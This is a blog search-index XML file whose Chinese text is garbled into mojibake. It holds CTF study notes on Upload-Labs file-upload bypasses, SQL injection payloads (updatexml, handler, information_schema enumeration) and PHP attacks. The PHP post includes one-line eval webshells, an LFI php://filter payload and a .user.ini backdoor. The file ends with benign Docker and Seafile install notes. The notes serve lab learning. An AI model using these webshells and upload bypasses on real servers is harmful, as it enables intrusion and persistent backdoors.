<?xml version="1.0" encoding="utf-8" standalone="yes"?><search><entry><title>CTFè®°å½• Upload Labs Linuxè®°å½•</title><url>/post/2023-04-28_ctf%E8%AE%B0%E5%BD%95-upload-labs-linux%E8%AE%B0%E5%BD%95/</url><categories><category><no value=/></categories><tags><tag><no value=/><tag><no value=/></tags><content type="html"><![CDATA[CTF-Upload-Labs-Linuxè®°å½•
Pass-01 å‰ç«¯JSæ ¡éªŒ è§£å†³æ–¹æ¡ˆï¼š ç›´æ¥è¿è¡ŒcheckFile=()=&gt;{return true}ä¿®æ”¹checkFileå‡½æ•°å³å¯
Pass-02 åå°MIMEæ£€æŸ¥ è§£å†³æ–¹æ¡ˆï¼š ä¿®æ”¹POSTæ•°æ®åŒ… Content-Typeï¼šimage/jpeg æˆ–è€…image/png æˆ– image/gif
Pass-03 åå°åç¼€åˆ¤å®š è§£å†³æ–¹æ¡ˆï¼š phpä¿®æ”¹ä¸ºphtmlåç¼€ä¸Šä¼ ã€‚
Pass-04 é»‘åå•éªŒè¯ .htaccessç»•è¿‡ Pass-03çš„è¿›é˜¶ï¼ åå°ç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼
$deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;php1&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;pHp1&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º è§£å†³æ–¹æ¡ˆï¼š åŸºæœ¬æ–¹æ³•ï¼šä¸Šä¼ .htaccess,å°†jpgä½œä¸ºphpè§£æ
AddHandler application/x-httpd-php .php5 .php3 .pht .phtml .phps .jpg ç„¶åä¸Šä¼ jpgä¸€å¥è¯
Pass-05 é»‘åå•éªŒè¯ï¼Œå¤§å°å†™ç»•è¿‡ $deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;,&#34;.htaccess&#34;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º è§£å†³æ–¹æ¡ˆï¼š ä¸Šä¼ å¤§å†™æ–‡ä»¶å
Pass-06 é»‘åå•éªŒè¯ï¼Œç©ºæ ¼ç»•è¿‡ $deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;,&#34;.htaccess&#34;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA è§£å†³æ–¹æ¡ˆï¼š ä¸Šä¼ æ–‡ä»¶ååŠ ç©ºæ ¼
Pass-07 é»‘åå•éªŒè¯ï¼Œç‚¹å·ç»•è¿‡ $deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;,&#34;.htaccess&#34;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º è§£å†³æ–¹æ¡ˆï¼š ä¸Šä¼ æ–‡ä»¶åå°¾åŠ .
Pass-08 é»‘åå•éªŒè¯ï¼Œ$DATAç»•è¿‡ $deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;,&#34;.htaccess&#34;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º è§£å†³æ–¹æ¡ˆï¼š windowsç¯å¢ƒä¸‹æœ‰æ•ˆï¼Œbuuoj.cnæä¾›ç¯å¢ƒæ— æ•ˆã€‚
phpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+&quot;::$DATA&quot;ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ&quot;::$DATA&quot;ä¹‹å‰çš„æ–‡ä»¶å ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€åã€‚
Pass-09 é»‘åå•éªŒè¯ ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡ $deny_ext = array(&#34;.php&#34;,&#34;.php5&#34;,&#34;.php4&#34;,&#34;.php3&#34;,&#34;.php2&#34;,&#34;.html&#34;,&#34;.htm&#34;,&#34;.phtml&#34;,&#34;.pht&#34;,&#34;.pHp&#34;,&#34;.pHp5&#34;,&#34;.pHp4&#34;,&#34;.pHp3&#34;,&#34;.pHp2&#34;,&#34;.Html&#34;,&#34;.Htm&#34;,&#34;.pHtml&#34;,&#34;.jsp&#34;,&#34;.jspa&#34;,&#34;.jspx&#34;,&#34;.jsw&#34;,&#34;.jsv&#34;,&#34;.jspf&#34;,&#34;.jtml&#34;,&#34;.jSp&#34;,&#34;.jSpx&#34;,&#34;.jSpa&#34;,&#34;.jSw&#34;,&#34;.jSv&#34;,&#34;.jSpf&#34;,&#34;.jHtml&#34;,&#34;.asp&#34;,&#34;.aspx&#34;,&#34;.asa&#34;,&#34;.asax&#34;,&#34;.ascx&#34;,&#34;.ashx&#34;,&#34;.asmx&#34;,&#34;.cer&#34;,&#34;.aSp&#34;,&#34;.aSpx&#34;,&#34;.aSa&#34;,&#34;.aSax&#34;,&#34;.aScx&#34;,&#34;.aShx&#34;,&#34;.aSmx&#34;,&#34;.cEr&#34;,&#34;.sWf&#34;,&#34;.swf&#34;,&#34;.htaccess&#34;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º è§£å†³æ–¹æ¡ˆï¼š ä¸Šä¼ æ–‡ä»¶åæ”¹ä¸º2.php. . deldotæ–¹æ³•ä¸‹ &ldquo;. .&ldquo;ä¼šå˜æˆ&rdquo;. &quot; windowsç¯å¢ƒä¸‹ç›´æ¥è®¿é—®2.php LINUXç¯å¢ƒä¸‹è®¿é—®2.php.%20
Pass-10 é»‘åå•éªŒè¯ åŒå†™ç»•è¿‡ $deny_ext = array(&#34;php&#34;,&#34;php5&#34;,&#34;php4&#34;,&#34;php3&#34;,&#34;php2&#34;,&#34;html&#34;,&#34;htm&#34;,&#34;phtml&#34;,&#34;pht&#34;,&#34;jsp&#34;,&#34;jspa&#34;,&#34;jspx&#34;,&#34;jsw&#34;,&#34;jsv&#34;,&#34;jspf&#34;,&#34;jtml&#34;,&#34;asp&#34;,&#34;aspx&#34;,&#34;asa&#34;,&#34;asax&#34;,&#34;ascx&#34;,&#34;ashx&#34;,&#34;asmx&#34;,&#34;cer&#34;,&#34;swf&#34;,&#34;htaccess&#34;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = str_ireplace($deny_ext,&#34;&#34;, $file_name); è§£å†³æ–¹æ¡ˆï¼š ä¸Šä¼ æ–‡ä»¶åæ”¹ä¸º2.pphphp
Pass-11 ç™½åå•éªŒè¯ ï¼ˆGETå‹0x00æˆªæ–­ï¼‰ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&#34;.&#34;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_GET[&#39;save_path&#39;].&#34;/&#34;.rand(10, 99).date(&#34;YmdHis&#34;).&#34;.&#34;.$file_ext; çº¿ä¸Šå®éªŒä¸æˆåŠŸï¼Œå› ä¸ºPHPç‰ˆæœ¬å·ä¸º7.2.21ã€‚ è®¾ç½®ä¸Šä¼ è·¯å¾„ä¸ºupload/2.php%00 ,2.php%00å†…å®¹ä¸ºäº†æ§åˆ¶è·¯å¾„ï¼Œä¸Šä¼ æ–‡ä»¶åç¼€ä¸ºç™½åå•å³å¯ ä¾‹:test.jpgï¼Œä¿å­˜åä¸º/upload/2.php%00test.jpgï¼Œä½†æœåŠ¡ç«¯è¯»å–åˆ°%00æ—¶ä¼šè‡ªåŠ¨ç»“æŸï¼Œå°†æ–‡ä»¶å†…å®¹ä¿å­˜è‡³2.phpä¸­ ? PS:éœ€è¦phpçš„ç‰ˆæœ¬å·ä½äº5.3.29ï¼Œä¸”magic_quotes_gpcä¸ºå…³é—­çŠ¶æ€
Pass-12 ç™½åå•æ ¡éªŒï¼ˆPOSTå‹0x00æˆªæ–­ï¼‰ åŒPass-11 ï¼Œsave_pathæ”¹ä¸ºPOSTæ•°æ®
Pass-13 æ–‡ä»¶åŒ…å«æ¼æ´ å›¾ç‰‡é©¬1 æœ¬é¢˜å·²ç»æç¤ºä½¿ç”¨
header(&#34;Content-Type:text/html;charset=utf-8&#34;); $file = $_GET[&#39;file&#39;]; if(isset($file)){ include $file; }else{ show_source(__file__); } ?&gt; ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬åï¼Œç”¨include.php?file=upload/5020230428025600.jpgå³å¯
Pass-14 æ–‡ä»¶åŒ…å«æ¼æ´ å›¾ç‰‡é©¬2 åŒ Pass-13ï¼ŒåŒºåˆ«åœ¨äºå›¾ç‰‡é©¬çš„åˆ¤æ–­ä¸ä¸€æ ·
Pass-15 æ–‡ä»¶åŒ…å«æ¼æ´ å›¾ç‰‡é©¬3 åŒ Pass-13ï¼ŒåŒºåˆ«åœ¨äºå›¾ç‰‡é©¬çš„åˆ¤æ–­ä¸ä¸€æ ·
Pass-16 æ–‡ä»¶åŒ…å«æ¼æ´ äºŒæ¬¡æ¸²æŸ“ ä¸Šä¼ å¤§å›¾ç‰‡ï¼Œç„¶åä¸€å¥è¯æ¢ä½ç½®åŒºå—ï¼Œç›´æ¥äºŒæ¬¡æ¸²æŸ“ä¸åˆ é™¤ä¸€å¥è¯
Pass-17 æ¡ä»¶ç«äº‰ éœ€è¦çˆ†ç ´
]]></content></entry><entry><title>CTFè®°å½• SQLæ³¨å…¥</title><url>/post/2023-04-26_ctf%E8%AE%B0%E5%BD%95-sql%E6%B3%A8%E5%85%A5/</url><categories><category><no value=/></categories><tags><tag>CTF</tag><tag>SQL</tag></tags><content type="html"><![CDATA[CTFå­¦ä¹ è®°å½•-SQLæ³¨å…¥
MYSQL å¸¸ç”¨å‘½ä»¤ #å½“å‰ç”¨æˆ· select user(); #å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ select datebase() ; #å½“å‰å…¨éƒ¨æ•°æ®åº“å select group_concat(schema_name) from information_schema.schemata; #xæ•°æ®åº“ä¸‹çš„è¡¨ select group_concat(table_name) from information_schema.tables where table_schema=&#39;x&#39;; #xæ•°æ®åº“ä¸‹çš„yè¡¨çš„åˆ— select group_concat(column_name) from information_schema.columns where table_schema=&#39;x&#39; and table_name=&#39;y&#39; å †å æ³¨å…¥ handleræ³¨å…¥å¯ä»¥ä½¿ç”¨showå‘½ä»¤å’Œhandlerçš„æƒ…å†µä¸‹ã€‚
å…ˆè¯•ç”¨showå‘½ä»¤è·å–ä¿¡æ¯
show tablesæˆ–show tables from database_name; â€” æ˜¾ç¤ºå½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„åç§°ã€‚ show databases; â€” æ˜¾ç¤ºmysqlä¸­æ‰€æœ‰æ•°æ®åº“çš„åç§°ã€‚ show columns from table_name from database_name; æˆ–show columns from database_name.table_name; â€” æ˜¾ç¤ºè¡¨ä¸­åˆ—åç§°ã€‚ ç”¨tableå‘½ä»¤è¯»å–è¡¨
Handler table OPEN;Handler table read first;Handler table close æŠ¥é”™æ³¨å…¥ updatexmlå‡½æ•°
updatexml(xml_doument,XPath_string,new_value) ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚ ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®
å®é™…ä½¿ç”¨ä¸­ä½¿ç”¨ç¬¬äºŒä¸ªå‚æ•°ã€‚èŒƒä¾‹å¦‚ä¸‹ï¼š
updatexml(1,concat(0x7e,version()),0) updatexml(1,concat(0x7e,database()),0) concatåœ¨éœ€è¦çš„æ•°æ®å‰é¢åŠ ä¸Šä¸€ä¸ªXPATHæ ¡éªŒå¤±è´¥çš„å‚æ•° æ­£å¸¸ä½¿ç”¨0x7e(~ çš„16è¿›åˆ¶)
updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(%27geek%27))),1) ç©ºæ ¼é™åˆ¶æƒ…å†µä¸‹å¯ä»¥ç”¨()æ›¿ä»£
]]></content></entry><entry><title>CTFè®°å½• PHP</title><url>/post/2023-04-25_ctf%E8%AE%B0%E5%BD%95-php/</url><categories><category><no value=/></categories><tags><tag>CTF</tag><tag>PHP</tag></tags><content type="html"><![CDATA[CTFå­¦ä¹ è®°å½•-PHPå‡ºç°ä»¥ä¸‹å¤„ç†æ–¹æ¡ˆ
ä¸€å¥è¯æœ¨é©¬ &lt;?php @eval($_POST[&#39;shell&#39;]);?&gt; &lt;script language=&#34;php&#34;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt; PHP LFI æ¼æ´ æºä»£ç å¦‚ä¸‹
&lt;meta charset=&#34;utf8&#34;&gt; &lt;?php error_reporting(0); $file = $_GET[&#34;file&#34;]; if(stristr($file,&#34;php://input&#34;) || stristr($file,&#34;zip://&#34;) || stristr($file,&#34;phar://&#34;) || stristr($file,&#34;data:&#34;)){ exit(&#39;hacker!&#39;); } if($file){ include($file); }else{ echo &#39;&lt;a href=&#34;?file=flag.php&#34;&gt;tips&lt;/a&gt;&#39;; } ?&gt; ä½¿ç”¨PHPä¼ªåè®®å°†flag.phpæ–‡ä»¶è½¬æ¢æˆbase64 æ ¼å¼
php://filter/read=convert.base64-encode/resource=flag.php PHP ååºåˆ—åŒ– unserialize()å‡½æ•° phpåœ¨unserialize()å‡½æ•°ä¸­å°†å­—ç¬¦ä¸²æ¢å¤ä¸ºå¯¹è±¡æ—¶ä¼šè°ƒç”¨PHPé­”æœ¯æ–¹æ³•
æ–¹æ³• ä½œç”¨ __construct() æ„é€ å‡½æ•°ï¼Œå®ä¾‹åŒ–ç±»æ—¶è‡ªåŠ¨è°ƒç”¨ __destruct() ææ„å‡½æ•°ï¼Œé”€æ¯å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ __sleep() åºåˆ—åŒ–å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ __wakeup() ååºåˆ—åŒ–å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ __toString() ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶è‡ªåŠ¨è°ƒç”¨ ä½¿ç”¨ä»¥ä¸‹ä»£ç å¯ä»¥äº§ç”Ÿæ¸—é€éœ€è¦çš„åºåˆ—åŒ–å­—ç¬¦ä¸²
&lt;?php class Name{ private $username = &#39;admin&#39;; private $password = &#39;100&#39;; } $object = new Name(); var_dump(serialize($object)) ; ?&gt; O:4:&ldquo;Name&rdquo;:2:{s:14:&quot; Name username&quot;;s:5:&ldquo;admin&rdquo;;s:14:&quot; Name password&quot;;s:3:&ldquo;100&rdquo;;}
class å±æ€§ç±»å‹ éœ€è¦æ³¨æ„çš„æ˜¯å˜é‡å—åˆ°ä¸åŒä¿®é¥°ç¬¦ï¼ˆpublicï¼Œprivateï¼Œprotectedï¼‰ä¿®é¥°è¿›è¡Œåºåˆ—åŒ–æ—¶ï¼Œåºåˆ—åŒ–åå˜é‡çš„é•¿åº¦å’Œåç§°ä¼šå‘ç”Ÿå˜åŒ–ã€‚
ä½¿ç”¨publicä¿®é¥°è¿›è¡Œåºåˆ—åŒ–åï¼Œå˜é‡é•¿åº¦ä¸å˜ï¼Œæ­£å¸¸è¾“å‡ºã€‚ ä½¿ç”¨privateä¿®é¥°è¿›è¡Œåºåˆ—åŒ–åï¼Œåºåˆ—åŒ–æ—¶: \x00 + [ç§æœ‰æˆå‘˜æ‰€åœ¨ç±»å] + \x00 [å˜é‡å] ä½¿ç”¨protectedä¿®é¥°è¿›è¡Œåºåˆ—åŒ–åï¼Œåºåˆ—åŒ–æ—¶ï¼š\x00 + * + \x00 + [å˜é‡å] PHP7.1ä»¥ä¸Šç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œpublicå±æ€§åºåˆ—åŒ–ä¸ä¼šå‡ºç°ä¸å¯è§å­—ç¬¦ï¼Œå¯ä»¥ç”¨publicå±æ€§æ¥ç»•è¿‡ åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡Waf é“¾æ¥ åˆ©ç”¨.htaccesså’Œå›¾ç‰‡ä¸Šä¼ æœ¨é©¬ .htaccess
SetHandler application/x-httpd-php åˆ©ç”¨.user.iniä¸Šä¼ \éšè—åé—¨ å‚è€ƒé“¾æ¥ æ¡ä»¶ï¼š
1ã€æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP 2ã€æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼ 3ã€ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶ GIF89a //ç»•è¿‡exif_imagetype() auto_prepend_file=a.jpg //æŒ‡å®šåœ¨ä¸»æ–‡ä»¶ä¹‹å‰è‡ªåŠ¨è§£æçš„æ–‡ä»¶çš„åç§°ï¼Œå¹¶åŒ…å«è¯¥æ–‡ä»¶ï¼Œå°±åƒä½¿ç”¨requireå‡½æ•°è°ƒç”¨å®ƒä¸€æ ·ã€‚ auto_append_file=a.jpg //è§£æåè¿›è¡ŒåŒ…å« ]]></content></entry><entry><title>å…³äº Hugo NexT ç»„ç»‡</title><url>/about.html</url><categories/><tags/><content type="html">Hugo NexT ç»„ç»‡æ˜¯ç”±ä¼—å¤šå–œçˆ± NexT ä¸»é¢˜åŠé£æ ¼çš„ä¸–ç•Œå„åœ°å‹äººå…±åŒç»„å»ºè€Œæˆï¼Œä¸ºçš„å°±æ˜¯è®©è¿™ä¸ªä¸»é¢˜ç»§ç»­åœ¨ Hugo å¼•æ“ä¸­ä¹Ÿèƒ½å¾—åˆ°å‘æ‰¬å…‰å¤§ï¼Œåœ¨æ­¤ä¹Ÿæ¬¢è¿ä½ çš„åŠ å…¥ï¼
æˆ‘ä»¬çš„æ„¿æ™¯ å»¶ç»­ NexT ç»å…¸çš„é»‘ç™½è°ƒæ­é…ï¼Œä¿æŒç®€å•çš„æ˜“ç”¨æ€§åŠå¼ºå¤§çš„åŠŸèƒ½ã€‚
ä½¿ç”¨åé¦ˆ åŠ å…¥ GitHub Discussions æˆ– Gitter åœ¨çº¿è®¨è®º ğŸ» GitHub Issues æäº¤é”™è¯¯æŠ¥å‘Š ğŸ› GitHub Feature è¡¨æ–°åŠŸèƒ½çš„æƒ³æ³• âœ¨ åŒæ—¶å›½å†…ç”¨æˆ·ä¹Ÿå¯åŠ å…¥ QQ ç¾¤äº¤æµï¼š 604710815</content></entry><entry><title>å®‰è£…ç­¾åˆ°ç½‘ç«™</title><url>/post/2020-11-15_%E5%AE%89%E8%A3%85%E7%AD%BE%E5%88%B0%E7%BD%91%E7%AB%99/</url><categories><category><no value=/></categories><tags><tag><no value=/><tag><no value=/></tags><content type="html">#å®‰è£…ç­¾åˆ°ç½‘ç«™ https://github.com/AragonSnow/qiandao 1. ä¸‹è½½docker-ceçš„repo curl https://download.docker.com/linux/centos/docker-ce.repo -o /etc/yum.repos.d/docker-ce.repo 2. å®‰è£…ä¾èµ– yum install https://download.docker.com/linux/fedora/30/x86_64/stable/Packages/containerd.io-1.2.6-3.3.fc30.x86_64.rpm 3. å®‰è£…docker-ce dnf -y install docker-ce docker-ce-cli --nobest 4.å¯åŠ¨ docker systemctl start docker 5.æŸ¥çœ‹ docker ç‰ˆæœ¬ä¿¡æ¯ docker -v 6.è®¾ç½®å¼€æœºè‡ªåŠ¨å¯åŠ¨ systemctl enable --now docker å®‰è£…dockerå®¹å™¨ docker run -d --restart=always --name qiandao -p 12345:80 -v $(pwd)/qiandao/config:/usr/src/app/config asdaragon/qiandao å®‰è£…å®Œæˆåæ³¨å†Œè´¦å· docker exec -it qiandao /bin/bash python ./chrole.py åˆšæ‰æ³¨å†Œçš„é‚®ç®± admin è®¾ç½®ä¸ºç®¡ç†å‘˜</content></entry><entry><title>centos8å®‰è£…seafile</title><url>/post/2020-11-10_centos8%E5%AE%89%E8%A3%85seafile/</url><categories><category>web</category></categories><tags><tag>seafile</tag><tag>centos</tag></tags><content type="html">centos8å®‰è£…seafile
centos8 å®‰è£…seafile å°è®° 1.å®‰è£…centos é¦–å…ˆå®‰è£…centos8ï¼ŒåŸºæœ¬çš„é…ç½®æ“ä½œã€‚
å‡çº§centoså†…æ ¸ æ“ä½œç•¥
//å‡çº§ç³»ç»Ÿ yum -y update /å®‰è£… wget yum -y install wget
è®¾ç½®ä¸ºé˜¿é‡Œyumæº
